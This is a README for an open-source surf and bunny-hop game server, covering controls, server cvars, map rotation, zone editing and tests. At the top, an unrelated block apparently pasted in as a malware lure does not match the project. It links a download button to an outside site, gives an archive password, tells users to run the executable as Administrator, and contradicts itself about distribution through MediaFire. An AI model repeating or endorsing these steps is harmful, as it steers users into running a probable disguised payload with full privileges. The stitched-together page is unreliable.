<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

## From Maintainer & WARNING
This project, along with every asset it is built on, was built initially with **Claude Code** and will continue to be maintained and extended using it. This is because I (`gamemann`) cannot build the entire TMC platform alone (I wish I could lol).

**Please treat this as partially tested.** It has its own headless test suite and that suite passes, but very little of this has been in front of real players yet. Expect rough edges, and please report anything you run into.

I intend on reviewing code, testing, and editing documentation regularly. If you're interested in helping out, please let me know!

## How it plays
Each map has a start zone and an end zone. Leaving the start zone starts your timer and reaching the end stops it. Your best time on each map, track and style is a record, and the fastest one on the server is the world record. Some maps are split into stages, and some have bonus tracks.

The movement uses the classic units and cvars (`sv_airaccelerate`, `sv_autobunnyhopping` and the rest), so surfing and strafing feel the way they always have.

There are styles for a harder run: normal, sideways, half-sideways, backwards, low gravity and prebhop. A run made with an admin's help (noclip, a speed change and so on) is never saved.

## Controls

| Key | Action |
| --- | --- |
| **WASD** | Move |
| **Space** | Jump (hold it, if the server allows auto-hop) |
| **Ctrl** | Duck |
| **F5** | First or third person |
| **F** | Flashlight. Only you see it |
| **O** | Hide every other player and the record's ghost |
| **Tab** (hold) | The scoreboard: everybody on the server with their style, best time and rank on this map, how long they have been on, and their ping |
| **N** | Change style |
| **R** | Back to the start of the stage you are in (or of the track, outside a stage). **R R** quickly: back to the main start zone, from a bonus too |
| **C** / **V** | Save a practice checkpoint / go back to it |
| **Y** / **U** | Chat / team chat |
| **M** | The map list: every map, 1–7 or a click to change to it, 8 and 9 to turn the page. Offline, and on a server you started yourself (`./game.sh online`), it changes the map. On a public server staff change it (the owner picks the flag with `sv_map_menu_flag`), the only player on the server changes it too (`sv_map_menu_alone`, on by default), and anybody else's choice is a vote of the players there (at least `sv_map_menu_vote_min`, 2 by default; bots never count) |
## Running a server
Settings are cvars, in the units you already know. Set them in the server's config, on the command line, or live from the console. `cvarlist sv_` lists them all.

```
sv_autobunnyhopping 1        // hold jump to keep hopping
sv_airaccelerate 1000        // the default for every map
sv_gravity 800
sv_maxvelocity 3500
sv_crestlaunch 1.25          // how fast you must be going for a ramp's top to launch you (x run speed, 0 = never)
sv_allow_thirdperson 1
sv_flashlight 1              // players may use their own flashlight (F); nobody else sees it
sv_spec_list 1               // players see who is spectating them; 0 makes spectating anonymous
mp_freeroam 1                // spectators may fly a free camera; 0 keeps them on players
mp_freeroam_speed 12         // free camera speed, metres a second
mp_forcecamera 0             // 1 or 2 restricts the camera and switches free roam off
sv_stagger_snapshots 0       // 1 spreads snapshot work over the ticks between snapshots: a lower worst tick on a full server
sv_replay_bot 1              // the server record runs as a visible ghost
sv_map_sync_timeout 30       // how long a map change waits for slow clients
sv_deathmatch 0              // players can shoot each other
mp_killcam_time 7          // seconds of final killcam when a deathmatch ends (0 off)
sv_hunters 0                 // monsters walk the course
sv_props 0                   // players can place practice blocks
sv_ragdoll 1                 // a dead player falls as a ragdoll; 0 is a quick fall with no physics
sv_map_rotation_file cfg/maps.yml   // which installed maps rotate; see below
```

### Every setting as a file, a cvar and a panel
Each field of the server's configuration (`game/g2g_config.gd`, with its `##` description and range) is also a `g2g_<field>` cvar, unless it already has an `sv_` one. Layers, weakest first: the code default, `cfg/game/game-g2gfast/config/game.yml`, `cfg/server/game/game-g2gfast/config/game.yml`, `G2G_*` environment, `--g2g-*` arguments, then live cvars and the workbench. A dedicated server refuses to start on an unknown key or a bad value. Per-map movement lives in `cfg/game/game-g2gfast/dot_map/map/<map>.yml`. `g2g_config_dump` lists every field with the layer it came from; `g2g_config_diff save` writes what you changed as a file to copy into `cfg/game/game-g2gfast/config/game.yml` as the new defaults. dot-workbench's tuning panel (F9 in debug builds, `workbench http` for a loopback page when `workbench.enabled` is set in `cfg/server.yml`) edits the same fields and the block rules; an exported build needs `*.html` in the preset's `include_filter`.

`mp_teamblock` (0) and `mp_enemyblock` (1) with the `!block` and `!noblock` chat commands are dot-team's block rules. Runners are not solid to each other on this server (as in the genre), so they matter only once players are made solid.

### Which maps rotate
Put the maps you want played in `cfg/maps.yml` (named rotations, wildcards and `sv_map_rotation <name>`: see dot-map docs/rotation.md). A map you leave out stays installed: `g2g_map <id>` still loads it and **M** lists it, marked "not in rotation". It just never comes round on its own, and the vote and nominations don't offer it.

```yaml
mode: random          # or sequential
cooldown: 2           # maps that must pass before one comes back
maps:
  - bhop_eazy
  - bhop_evolve
  - surf_mesa
```

`.yaml`, `.json` (`{"maps": [...]}` or a plain list), and the old one-map-per-line `.txt`, `.cfg` or `.ini` work too. With no file every map rotates, except the combat surf maps (below). `g2g_maps_reload` re-reads it.

Played offline, by yourself, a map has no time limit. `--g2g-offline-map-seconds 1800` gives it one.

Console commands:

| Command | |
| --- | --- |
| `g2g_status` | What the server is doing |
| `g2g_map <id>` | Change the map, or list them with no id |
| `g2g_maps_reload` | Pick up maps added to `maps/` without a restart |
| `g2g_top` | Fastest times on this map |
| `g2g_ghost` | What the record ghost is running |
| `g2g_vote` | Open a map vote now |
| `g2g_hunt [clear\|spawn <id>]` | Show, clear or place hunters |
| `g2g_place_clear` | Clear every placed block |

## Maps
### Importing a map
The importer reads BSP version 20 maps. Put the `.bsp` files in `../inspirations/g2gfast/` and run:

```bash
tools/import_maps.sh      # imports anything new, skips what is already current
tools/bsp_preview.sh      # renders each map from its spawn, so you can look at it
```

The imported maps land in `maps/imported/`, which is a link to the g2gfast-maps checkout. A running server picks up new ones with `g2g_maps_reload`.

Collision comes from the map's brushes, not from what you can see, so invisible player clips and surf ramp clips work the way the mapper meant. Surfaces are coloured by their angle: one you can stand on, one you slide on, and a wall each look different.

### Zones
Most surf and bunny-hop maps name their own start and end zones, stages and bonuses, and the importer reads those. For a map that doesn't, write the zones in `maps/zones/<id>.json` (see `maps/zones/README.md`), or draw them in the game.

Every start, stage and finish is drawn as a glowing box: green start, red finish, amber stages, cyan and magenta for a bonus. **Esc → General → Zones** turns them off.

**Z** opens the zone editor. Aim at the floor: a marker follows your crosshair, snapped to the 16-unit grid.

| Key | |
| --- | --- |
| **1**–**6** | Start, end, stage, checkpoint, stop, pit |
| **T** | Main track, bonus 1, bonus 2, ... |
| **[** / **]** | The stage or checkpoint number |
| **PgUp** / **PgDn**, or the wheel | The height, 16 units at a time (128 by default) |
| **E** or click | Put a corner. The box follows your aim until the second one |
| **Backspace** | Take the last zone back |
| **Enter** | Save |
| **Z** or **Esc** | Close |

Offline it saves to `user://zones/<map>.json`, which the game loads in place of the map's own zones next time. On a server it sends the server's own zone commands for you, which need the changemap flag, and the server saves them the same way. The console still works:

```
g2g_zone start          // start drawing a start zone
g2g_zone_mark           // stand on one corner
g2g_zone_mark           // then the other
g2g_zone stage main 1   // the next zone: stage 1 of the main track
g2g_zone_save           // write them to disk
```

`g2g_zone_undo` removes the last one and `g2g_zone_list` lists them.

## Testing

```bash
./game.sh test                  # every script parses, then every suite runs
./game.sh test headless_run     # one suite
```

| Suite | What it covers |
| --- | --- |
| `headless_run` | The movement, the timer, the zones, and bots running every built-in map |
| `headless_net` | A server and a client in one process, over the network code |
| `headless_maps` | The map catalogue, map changes and the vote |
| `headless_presentation` | What a client draws and plays |
| `headless_stack` | The whole stack of addons together |
| `headless_imported` | Every imported map loads and has its zones |
| `headless_mechanics` | Every imported map's teleports, sinking blocks, pushes and water do what they should, with a player on them |
| `headless_config` | Every config field as a cvar and a profile, and the deathmatch rules reading them |
| `headless_workbench` | dot-workbench over the config: an edit, and the export as cfg/ defaults |
| `dedicated` | A real server: boots, loads the game, runs its commands |


---

MIT License

Copyright (c) 2026 game-g2gfast contributors

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
